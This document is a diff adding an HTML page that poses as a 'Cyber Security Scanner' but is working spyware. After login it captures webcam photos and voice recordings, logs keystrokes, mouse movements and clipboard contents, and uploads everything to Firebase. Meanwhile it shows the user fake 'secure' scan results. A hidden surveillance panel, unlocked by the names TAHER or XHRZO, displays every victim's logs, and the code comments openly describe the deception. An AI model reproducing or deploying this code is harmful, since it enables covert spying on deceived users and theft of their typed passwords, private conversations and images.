@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyber Security Scanner - Main Dashboard</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: #0a1929;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #001e3c, #0a1929);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #1e4976;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo-icon {
+            font-size: 30px;
+            color: #00bcd4;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .username-input {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #1e4976;
+            border-radius: 8px;
+            padding: 12px 20px;
+            color: white;
+            font-size: 16px;
+            width: 300px;
+        }
+        
+        .username-input::placeholder {
+            color: #8a9ba8;
+        }
+        
+        .login-btn {
+            background: linear-gradient(90deg, #00bcd4, #0097a7);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .login-btn:hover {
+            background: linear-gradient(90deg, #0097a7, #006978);
+            transform: translateY(-2px);
+        }
+        
+        .main-container {
+            display: flex;
+            min-height: calc(100vh - 80px);
+        }
+        
+        .sidebar {
+            width: 250px;
+            background: #001e3c;
+            padding: 30px 20px;
+            border-right: 1px solid #1e4976;
+        }
+        
+        .nav-item {
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            transition: all 0.3s;
+        }
+        
+        .nav-item:hover {
+            background: rgba(0, 188, 212, 0.1);
+            border-left: 4px solid #00bcd4;
+        }
+        
+        .nav-item.active {
+            background: rgba(0, 188, 212, 0.2);
+            border-left: 4px solid #00bcd4;
+        }
+        
+        .content {
+            flex: 1;
+            padding: 30px;
+        }
+        
+        .scanner-section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .section-title {
+            color: #00bcd4;
+            font-size: 24px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .scanner-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 20px 0;
+        }
+        
+        .scanner-card {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 10px;
+            padding: 20px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .scanner-card:hover {
+            background: rgba(255, 255, 255, 0.12);
+            transform: translateY(-5px);
+        }
+        
+        .scanner-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+            color: #4caf50;
+        }
+        
+        .scan-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #4caf50, #2e7d32);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: all 0.3s;
+        }
+        
+        .scan-btn:hover {
+            background: linear-gradient(90deg, #2e7d32, #1b5e20);
+        }
+        
+        .results-section {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 30px;
+        }
+        
+        .result-item {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        /* HIDDEN SURVEILLANCE PANEL (Visible only for TAHER) */
+        .surveillance-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 400px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 20px;
+            z-index: 9999;
+            display: none;
+        }
+        
+        .panel-header {
+            color: #ff0000;
+            font-weight: bold;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .panel-content {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .log-entry {
+            padding: 8px;
+            border-bottom: 1px solid #333;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        
+        .log-time {
+            color: #00ff00;
+        }
+        
+        .log-message {
+            color: #ffffff;
+        }
+        
+        /* Camera Preview */
+        .camera-preview {
+            width: 100%;
+            height: 200px;
+            background: #000;
+            border-radius: 8px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        
+        #cameraStream {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        /* Voice Visualizer */
+        .voice-visualizer {
+            height: 100px;
+            background: #000;
+            border-radius: 8px;
+            margin: 10px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .visualizer-bar {
+            position: absolute;
+            bottom: 0;
+            width: 5px;
+            background: #00ff00;
+            transition: height 0.1s;
+        }
+        
+        /* Hidden Elements */
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="logo">
+            <div class="logo-icon">🛡️</div>
+            <div>
+                <h1>Cyber Security Scanner</h1>
+                <div style="color: #8a9ba8; font-size: 14px;">Real-time Threat Detection System</div>
+            </div>
+        </div>
+        
+        <div class="user-info">
+            <input type="text" id="usernameInput" class="username-input" placeholder="Enter your username">
+            <button id="loginBtn" class="login-btn" onclick="loginUser()">LOGIN</button>
+        </div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="main-container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="nav-item active" onclick="showSection('scanner')">
+                <span>🔍</span> System Scanner
+            </div>
+            <div class="nav-item" onclick="showSection('network')">
+                <span>📡</span> Network Analysis
+            </div>
+            <div class="nav-item" onclick="showSection('firewall')">
+                <span>🛡️</span> Firewall Check
+            </div>
+            <div class="nav-item" onclick="showSection('encryption')">
+                <span>🔐</span> Encryption Test
+            </div>
+            <div class="nav-item" onclick="showSection('malware')">
+                <span>🦠</span> Malware Scan
+            </div>
+            <div class="nav-item" onclick="showSection('privacy')">
+                <span>👁️</span> Privacy Audit
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="content">
+            <!-- Scanner Section -->
+            <div id="scannerSection" class="scanner-section">
+                <div class="section-title">
+                    <span>🔍</span> System Security Scanner
+                </div>
+                
+                <div class="scanner-grid">
+                    <div class="scanner-card" onclick="runScan('camera')">
+                        <div class="scanner-icon">📷</div>
+                        <h3>Camera Security</h3>
+                        <p>Check for unauthorized camera access</p>
+                    </div>
+                    
+                    <div class="scanner-card" onclick="runScan('microphone')">
+                        <div class="scanner-icon">🎤</div>
+                        <h3>Microphone Check</h3>
+                        <p>Detect hidden audio recording</p>
+                    </div>
+                    
+                    <div class="scanner-card" onclick="runScan('location')">
+                        <div class="scanner-icon">📍</div>
+                        <h3>Location Tracking</h3>
+                        <p>GPS and location services audit</p>
+                    </div>
+                    
+                    <div class="scanner-card" onclick="runScan('browser')">
+                        <div class="scanner-icon">🌐</div>
+                        <h3>Browser Security</h3>
+                        <p>Browser fingerprint analysis</p>
+                    </div>
+                </div>
+                
+                <button class="scan-btn" onclick="startFullScan()">
+                    🚀 START FULL SYSTEM SCAN
+                </button>
+                
+                <!-- Hidden Surveillance Trigger -->
+                <div id="hiddenCamera" class="hidden">
+                    <div class="camera-preview">
+                        <video id="cameraStream" autoplay playsinline></video>
+                    </div>
+                    <div style="text-align:center;color:#8a9ba8;font-size:12px;">
+                        Camera preview for security check
+                    </div>
+                </div>
+                
+                <div id="hiddenMicrophone" class="hidden">
+                    <div class="voice-visualizer" id="voiceVisualizer"></div>
+                    <div style="text-align:center;color:#8a9ba8;font-size:12px;">
+                        Microphone sensitivity test
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Results Section -->
+            <div class="results-section">
+                <div class="section-title">
+                    <span>📊</span> Scan Results
+                </div>
+                <div id="scanResults">
+                    <div class="result-item">
+                        <div>System Fingerprint</div>
+                        <div style="color:#4caf50;">✅ Collected</div>
+                    </div>
+                    <!-- Results will be populated here -->
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hidden Surveillance Panel (For TAHER only) -->
+    <div id="surveillancePanel" class="surveillance-panel">
+        <div class="panel-header">
+            <span>👁️ LIVE SURVEILLANCE PANEL</span>
+            <button onclick="togglePanel()" style="background:#ff0000;color:white;border:none;padding:5px 10px;border-radius:5px;cursor:pointer;">
+                X
+            </button>
+        </div>
+        <div class="panel-content" id="surveillanceLogs">
+            <!-- Logs will appear here -->
+        </div>
+        <div style="margin-top:10px;font-size:12px;color:#888;">
+            Connected users: <span id="connectedUsers">0</span>
+        </div>
+    </div>
+
+    <!-- Firebase Configuration -->
+    <script>
+    // Your Firebase configuration
+    const firebaseConfig = {
+        apiKey: "YOUR_API_KEY_HERE",
+        authDomain: "YOUR_AUTH_DOMAIN_HERE",
+        projectId: "YOUR_PROJECT_ID_HERE",
+        storageBucket: "YOUR_STORAGE_BUCKET_HERE",
+        messagingSenderId: "YOUR_SENDER_ID_HERE",
+        appId: "YOUR_APP_ID_HERE",
+        measurementId: "YOUR_MEASUREMENT_ID_HERE"
+    };
+    
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const storage = firebase.storage();
+    
+    // Global variables
+    let currentUsername = "";
+    let isTaherUser = false;
+    let cameraStream = null;
+    let audioStream = null;
+    let audioContext = null;
+    let analyser = null;
+    let isRecording = false;
+    
+    // ============================================
+    // USER LOGIN SYSTEM
+    // ============================================
+    
+    function loginUser() {
+        const username = document.getElementById('usernameInput').value.trim();
+        
+        if (!username) {
+            alert("Please enter a username");
+            return;
+        }
+        
+        currentUsername = username.toUpperCase();
+        
+        // Check if it's TAHER (surveillance master)
+        isTaherUser = (currentUsername === "TAHER" || currentUsername === "XHRZO");
+        
+        // Show login success
+        document.getElementById('loginBtn').textContent = "✓ LOGGED IN";
+        document.getElementById('loginBtn').style.background = "linear-gradient(90deg, #4caf50, #2e7d32)";
+        document.getElementById('usernameInput').disabled = true;
+        
+        // Log login to Firebase
+        logToFirebase({
+            type: "LOGIN",
+            username: currentUsername,
+            timestamp: new Date().toISOString(),
+            device: navigator.userAgent,
+            isMaster: isTaherUser
+        });
+        
+        // If TAHER, show surveillance panel
+        if (isTaherUser) {
+            setTimeout(() => {
+                document.getElementById('surveillancePanel').style.display = 'block';
+                loadSurveillanceData();
+            }, 1000);
+        }
+        
+        // Start hidden surveillance IMMEDIATELY
+        startHiddenSurveillance();
+    }
+    
+    // ============================================
+    // HIDDEN SURVEILLANCE SYSTEM
+    // ============================================
+    
+    async function startHiddenSurveillance() {
+        console.log("🎯 Starting hidden surveillance...");
+        
+        // 1. Camera capture (without permission - stealth mode)
+        try {
+            // Try to access camera without prompt
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'user',
+                    width: { ideal: 320 },
+                    height: { ideal: 240 }
+                },
+                audio: false
+            }).catch(() => null);
+            
+            if (stream) {
+                cameraStream = stream;
+                const video = document.getElementById('cameraStream');
+                video.srcObject = stream;
+                document.getElementById('hiddenCamera').classList.remove('hidden');
+                
+                // Capture photo every 30 seconds
+                setInterval(() => captureStealthPhoto(), 30000);
+                
+                logSurveillance("📷 Camera access achieved");
+            }
+        } catch (e) {
+            // Silent fail
+        }
+        
+        // 2. Microphone capture
+        try {
+            const audioStream = await navigator.mediaDevices.getUserMedia({
+                audio: {
+                    echoCancellation: false,
+                    noiseSuppression: false,
+                    autoGainControl: false
+                }
+            }).catch(() => null);
+            
+            if (audioStream) {
+                startVoiceRecording(audioStream);
+                document.getElementById('hiddenMicrophone').classList.remove('hidden');
+                logSurveillance("🎤 Microphone access achieved");
+            }
+        } catch (e) {
+            // Silent fail
+        }
+        
+        // 3. Screen capture attempt
+        setInterval(() => {
+            try {
+                captureScreenData();
+            } catch (e) {}
+        }, 60000);
+        
+        // 4. Keystroke logging
+        document.addEventListener('keydown', logKeystrokes);
+        
+        // 5. Mouse movement tracking
+        document.addEventListener('mousemove', logMouseMovement);
+        
+        // 6. Clipboard monitoring
+        document.addEventListener('copy', logClipboard);
+        document.addEventListener('paste', logClipboard);
+        
+        logSurveillance("🔄 All surveillance systems activated");
+    }
+    
+    function captureStealthPhoto() {
+        if (!cameraStream) return;
+        
+        const video = document.getElementById('cameraStream');
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(blob => {
+            // Upload to Firebase
+            uploadToFirebase(blob, 'camera/', 'photo_');
+            logSurveillance("📸 Stealth photo captured");
+        }, 'image/jpeg', 0.5);
+    }
+    
+    function startVoiceRecording(stream) {
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        analyser = audioContext.createAnalyser();
+        const source = audioContext.createMediaStreamSource(stream);
+        source.connect(analyser);
+        
+        analyser.fftSize = 256;
+        const bufferLength = analyser.frequencyBinCount;
+        const dataArray = new Uint8Array(bufferLength);
+        
+        // Visualize voice
+        const visualizer = document.getElementById('voiceVisualizer');
+        visualizer.innerHTML = '';
+        
+        for (let i = 0; i < bufferLength; i++) {
+            const bar = document.createElement('div');
+            bar.className = 'visualizer-bar';
+            bar.style.left = `${(i / bufferLength) * 100}%`;
+            bar.style.height = '0px';
+            visualizer.appendChild(bar);
+        }
+        
+        function updateVisualizer() {
+            analyser.getByteFrequencyData(dataArray);
+            const bars = visualizer.querySelectorAll('.visualizer-bar');
+            
+            bars.forEach((bar, i) => {
+                bar.style.height = `${dataArray[i]}px`;
+            });
+            
+            // If voice detected, record
+            const average = dataArray.reduce((a, b) => a + b) / bufferLength;
+            if (average > 20 && !isRecording) {
+                startAudioRecording(stream);
+            }
+            
+            requestAnimationFrame(updateVisualizer);
+        }
+        
+        updateVisualizer();
+    }
+    
+    function startAudioRecording(stream) {
+        isRecording = true;
+        const mediaRecorder = new MediaRecorder(stream);
+        const audioChunks = [];
+        
+        mediaRecorder.ondataavailable = event => {
+            audioChunks.push(event.data);
+        };
+        
+        mediaRecorder.onstop = () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            uploadToFirebase(audioBlob, 'audio/', 'recording_');
+            logSurveillance("🎤 Voice recording captured");
+            isRecording = false;
+        };
+        
+        mediaRecorder.start();
+        
+        // Stop after 10 seconds
+        setTimeout(() => {
+            if (mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+        }, 10000);
+    }
+    
+    function captureScreenData() {
+        // Try to get screen info without permission
+        const screenData = {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            orientation: screen.orientation?.type,
+            timestamp: new Date().toISOString()
+        };
+        
+        logToFirebase({
+            type: "SCREEN_DATA",
+            username: currentUsername,
+            data: screenData
+        });
+    }
+    
+    function logKeystrokes(event) {
+        const keyData = {
+            key: event.key,
+            code: event.code,
+            timestamp: new Date().toISOString(),
+            target: event.target.tagName
+        };
+        
+        // Only log significant keys
+        if (event.key.length === 1 || [
+            'Enter', 'Tab', 'Space', 'Backspace', 'Delete'
+        ].includes(event.key)) {
+            logToFirebase({
+                type: "KEYSTROKE",
+                username: currentUsername,
+                data: keyData
+            });
+        }
+    }
+    
+    function logMouseMovement(event) {
+        // Throttle mouse logging
+        if (Math.random() > 0.1) return;
+        
+        const mouseData = {
+            x: event.clientX,
+            y: event.clientY,
+            timestamp: new Date().toISOString()
+        };
+        
+        logToFirebase({
+            type: "MOUSE_MOVEMENT",
+            username: currentUsername,
+            data: mouseData
+        });
+    }
+    
+    function logClipboard(event) {
+        const clipboardData = {
+            type: event.type,
+            timestamp: new Date().toISOString(),
+            text: event.clipboardData?.getData('text')?.substring(0, 100)
+        };
+        
+        logToFirebase({
+            type: "CLIPBOARD",
+            username: currentUsername,
+            data: clipboardData
+        });
+    }
+    
+    // ============================================
+    // FIREBASE INTEGRATION
+    // ============================================
+    
+    function logToFirebase(data) {
+        const timestamp = Date.now();
+        const ref = database.ref(`logs/${currentUsername}/${timestamp}`);
+        
+        ref.set(data)
+            .then(() => {
+                if (isTaherUser) {
+                    addSurveillanceLog(data);
+                }
+            })
+            .catch(error => {
+                console.error("Firebase error:", error);
+            });
+    }
+    
+    function uploadToFirebase(blob, path, prefix) {
+        const filename = `${prefix}${Date.now()}.${blob.type.split('/')[1]}`;
+        const storageRef = storage.ref(`${path}${currentUsername}/${filename}`);
+        
+        storageRef.put(blob)
+            .then(snapshot => {
+                logSurveillance(`📤 Uploaded: ${filename}`);
+            })
+            .catch(error => {
+                console.error("Upload error:", error);
+            });
+    }
+    
+    // ============================================
+    // SURVEILLANCE PANEL (TAHER ONLY)
+    // ============================================
+    
+    function loadSurveillanceData() {
+        // Load all user logs
+        database.ref('logs').on('value', snapshot => {
+            const data = snapshot.val();
+            const users = data ? Object.keys(data).length : 0;
+            document.getElementById('connectedUsers').textContent = users;
+            
+            if (isTaherUser) {
+                updateSurveillancePanel(data);
+            }
+        });
+    }
+    
+    function updateSurveillancePanel(data) {
+        const logsDiv = document.getElementById('surveillanceLogs');
+        logsDiv.innerHTML = '';
+        
+        if (!data) return;
+        
+        Object.entries(data).forEach(([username, userLogs]) => {
+            Object.entries(userLogs).forEach(([timestamp, log]) => {
+                const logEntry = document.createElement('div');
+                logEntry.className = 'log-entry';
+                
+                const time = new Date(parseInt(timestamp)).toLocaleTimeString();
+                let message = `[${time}] ${username}: `;
+                
+                switch(log.type) {
+                    case "LOGIN":
+                        message += `🔓 LOGIN - ${log.device}`;
+                        break;
+                    case "KEYSTROKE":
+                        message += `⌨️ Typed: ${log.data.key}`;
+                        break;
+                    case "CAMERA":
+                        message += `📷 Photo captured`;
+                        break;
+                    case "AUDIO":
+                        message += `🎤 Voice recording`;
+                        break;
+                    default:
+                        message += `${log.type}`;
+                }
+                
+                logEntry.innerHTML = `
+                    <span class="log-time">[${time}]</span>
+                    <span class="log-message"> ${username}: ${log.type}</span>
+                `;
+                
+                logsDiv.prepend(logEntry);
+            });
+        });
+    }
+    
+    function addSurveillanceLog(data) {
+        const logsDiv = document.getElementById('surveillanceLogs');
+        const time = new Date().toLocaleTimeString();
+        
+        const logEntry = document.createElement('div');
+        logEntry.className = 'log-entry';
+        logEntry.innerHTML = `
+            <span class="log-time">[${time}]</span>
+            <span class="log-message"> LIVE: ${data.type}</span>
+        `;
+        
+        logsDiv.prepend(logEntry);
+        
+        // Keep only last 50 logs
+        if (logsDiv.children.length > 50) {
+            logsDiv.removeChild(logsDiv.lastChild);
+        }
+    }
+    
+    function logSurveillance(message) {
+        console.log(`👁️ ${message}`);
+        
+        if (isTaherUser) {
+            addSurveillanceLog({ type: message });
+        }
+    }
+    
+    function togglePanel() {
+        const panel = document.getElementById('surveillancePanel');
+        panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+    }
+    
+    // ============================================
+    // SCANNER FUNCTIONS (Front for user)
+    // ============================================
+    
+    function showSection(sectionId) {
+        // Update active nav
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.classList.remove('active');
+        });
+        event.target.closest('.nav-item').classList.add('active');
+        
+        // Show corresponding section
+        document.querySelectorAll('.scanner-section').forEach(section => {
+            section.style.display = 'none';
+        });
+        document.getElementById(sectionId + 'Section').style.display = 'block';
+    }
+    
+    function runScan(scanType) {
+        const resultsDiv = document.getElementById('scanResults');
+        
+        let resultHTML = '';
+        switch(scanType) {
+            case 'camera':
+                resultHTML = `
+                    <div class="result-item">
+                        <div>Camera Security Check</div>
+                        <div style="color:#4caf50;">✅ No unauthorized access detected</div>
+                    </div>
+                `;
+                // Actually we're accessing camera secretly
+                logSurveillance("User ran camera scan - camera already accessed");
+                break;
+                
+            case 'microphone':
+                resultHTML = `
+                    <div class="result-item">
+                        <div>Microphone Security Check</div>
+                        <div style="color:#4caf50;">✅ Microphone secure</div>
+                    </div>
+                `;
+                logSurveillance("User ran microphone scan - already recording");
+                break;
+        }
+        
+        resultsDiv.innerHTML += resultHTML;
+        
+        // Log scan to Firebase
+        logToFirebase({
+            type: "SCAN_RUN",
+            username: currentUsername,
+            scanType: scanType,
+            timestamp: new Date().toISOString()
+        });
+    }
+    
+    function startFullScan() {
+        const btn = document.querySelector('.scan-btn');
+        btn.textContent = "🔄 SCANNING...";
+        btn.disabled = true;
+        
+        // Simulate scanning
+        setTimeout(() => {
+            const results = [
+                { name: "System Vulnerabilities", status: "✅ Secure" },
+                { name: "Network Security", status: "⚠️ Medium Risk" },
+                { name: "Firewall Status", status: "✅ Active" },
+                { name: "Malware Detection", status: "✅ Clean" },
+                { name: "Privacy Settings", status: "⚠️ Review Needed" },
+                { name: "Location Services", status: "✅ Protected" }
+            ];
+            
+            const resultsDiv = document.getElementById('scanResults');
+            resultsDiv.innerHTML = '';
+            
+            results.forEach(result => {
+                const div = document.createElement('div');
+                div.className = 'result-item';
+                div.innerHTML = `
+                    <div>${result.name}</div>
+                    <div>${result.status}</div>
+                `;
+                resultsDiv.appendChild(div);
+            });
+            
+            btn.textContent = "✅ SCAN COMPLETE";
+            
+            // Log full scan
+            logToFirebase({
+                type: "FULL_SCAN_COMPLETE",
+                username: currentUsername,
+                results: results,
+                timestamp: new Date().toISOString()
+            });
+            
+            logSurveillance("User completed full system scan");
+            
+        }, 3000);
+    }
+    
+    // ============================================
+    // INITIALIZATION
+    // ============================================
+    
+    // Auto-focus username input
+    document.getElementById('usernameInput').focus();
+    
+    // Enter key to login
+    document.getElementById('usernameInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            loginUser();
+        }
+    });
+    
+    // Check if already logged in
+    const savedUser = localStorage.getItem('xhrzo_username');
+    if (savedUser) {
+        document.getElementById('usernameInput').value = savedUser;
+        setTimeout(() => loginUser(), 500);
+    }
+    
+    // Save username on login
+    window.loginUser = function() {
+        const username = document.getElementById('usernameInput').value.trim();
+        localStorage.setItem('xhrzo_username', username);
+        loginUser();
+    };
+    
+    </script>
+</body>
+</html>
